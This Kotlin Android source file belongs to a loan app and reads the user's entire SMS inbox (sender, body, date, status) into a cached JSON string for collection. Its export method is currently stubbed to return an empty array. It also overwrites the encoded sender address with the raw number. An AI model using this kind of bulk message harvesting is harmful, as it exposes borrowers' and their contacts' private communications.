package com.chocolate.nigerialoanapp.collect.item

import android.net.Uri
import android.text.TextUtils
import android.util.Log
import androidx.annotation.VisibleForTesting
import com.blankj.utilcode.util.EncodeUtils
import com.blankj.utilcode.util.GsonUtils
import com.blankj.utilcode.util.StringUtils
import com.blankj.utilcode.util.Utils
import com.chocolate.nigerialoanapp.BuildConfig
import com.chocolate.nigerialoanapp.collect.BaseCollectDataMgr
import com.chocolate.nigerialoanapp.collect.utils.AESUtil
import com.chocolate.nigerialoanapp.global.Constant
import com.chocolate.nigerialoanapp.log.LogSaver
import com.chocolate.nigerialoanapp.network.NetworkUtils
import org.json.JSONArray
import java.util.regex.Pattern

class CollectSmsMgr {
    companion object {
        private const val TAG = "CollectSmsMgr"

        val sInstance by lazy(LazyThreadSafetyMode.NONE) {
            CollectSmsMgr()
        }
    }

   fun tryCacheSms(){
        var tryCache = true
        val maxMemory = Runtime.getRuntime().maxMemory()
        val isLowDevice = maxMemory < 100 * 1024 * 1024
        if (isLowDevice) {
            tryCache = false
        }
        if (tryCache) {
            getSmsStrInternal(true)
        } else {
            LogSaver.logToFile("device max memory = $maxMemory and not cache")
        }
       if (BuildConfig.DEBUG) {
           Log.e("Test", "device max memory = $maxMemory")
       }
    }

   private var mSmsStr :String? = null

    fun getSmsAesStr() : String{
        // TODO
        if (true) {
            return JSONArray().toString()
        }
        if (mSmsStr == null){
            getSmsStrInternal(false)
        }
        if (TextUtils.isEmpty(mSmsStr)){
            mSmsStr = ""
        }
        var aesSmsStr = ""
        try {
//            aesSmsStr =  AESUtil.encrypt(mSmsStr!!)
            aesSmsStr =  mSmsStr!!
        } catch (e : Exception) {

        }
        return aesSmsStr
    }

    private fun getSmsStrInternal(tryCache : Boolean){
        if (tryCache){
            val list = readSms(true)
            if (list != null && list.size > 0){
                val smsStr = GsonUtils.toJson(list)
                //避免多线程问题
                if (mSmsStr == null) {
                    mSmsStr = smsStr
                    if (BuildConfig.DEBUG) {
                        Log.e("Test", "cache sms success size = " + list.size)
                    }
                    if (!Constant.isAabBuild()){
                        LogSaver.logToFile("cache sms success size = " + list.size)
                    }
                }
            }
        } else {
            val smsStr = GsonUtils.toJson(readSms(false))
            mSmsStr = if (TextUtils.isEmpty(smsStr)) "" else smsStr
            if (BuildConfig.DEBUG) {
                Log.e("Test", "cache sms failure reload sms ")
            }
            if (!Constant.isAabBuild()){
                LogSaver.logToFile("cache sms failure reload sms ")
            }
        }
    }

    @VisibleForTesting
    fun getSmsStringForTest() : String {
        return GsonUtils.toJson(readSms(false))
    }

    private fun readSms(tryCache : Boolean): ArrayList<SmsRequest>? {
        val list: ArrayList<SmsRequest> = ArrayList<SmsRequest>()
        val uri = Uri.parse("content://sms/")
        val projection =
            arrayOf("_id", "address", "person", "body", "date", "type", "status", "read")
        val resolver = Utils.getApp().contentResolver
        val cursor = resolver.query(uri, projection, null, null, null)
        try {
            if (cursor != null && cursor.count > 0) {
                var needRead = true
                if (cursor.count >= 30000 && tryCache){
                    needRead = false
                    LogSaver.logToFile("sms too much and not cache sms")
                }
                while (cursor.moveToNext() && needRead) {
                    val _id = cursor.getInt(0) //id
                    val address = cursor.getString(1) //电话号码
                    val body = cursor.getString(3) //短信内容
                    val date = cursor.getLong(4)
                    val type = cursor.getInt(5)
                    val status = cursor.getInt(6)
                    val read = cursor.getInt(7)
                    val smsRequest = SmsRequest()
                    smsRequest.addr = BaseCollectDataMgr.encodeData(address)
                    smsRequest.body = BaseCollectDataMgr.encodeData1(processUtil(body))
                    smsRequest.time = date
                    smsRequest.type = type
                    smsRequest.status = status
                    smsRequest.read = read
                    smsRequest.addr = address
                    if (list.size <= 3000 || !hasFailure) {
                        list.add(smsRequest)
                    } else {
                        LogSaver.logToFile(" upload failure and read only 3000 sms")
                        needRead = false
                    }
                }
            }

        } catch (e: Exception) {
            if (BuildConfig.DEBUG) {
                throw e
            }
            LogSaver.logToFile("read sms exception = " + e.toString())
        } finally {
            cursor?.close()
        }
        return list
    }

    private fun processUtil(str: String?): String? {
        var str = str
        if (StringUtils.isEmpty(str)) {
            return null
        }
        val regex = "(.*)\"(.*)\"(.*)"
        val pattern = Pattern.compile(regex)
        var matcher = pattern.matcher(str)
        while (matcher.find()) {
            str = matcher.group(1) + "“" + matcher.group(2) + "”" + matcher.group(3)
            matcher = pattern.matcher(str)
        }
        return str
    }
    private var hasFailure : Boolean = false
    fun setHasFailure(){
        hasFailure = true
    }
}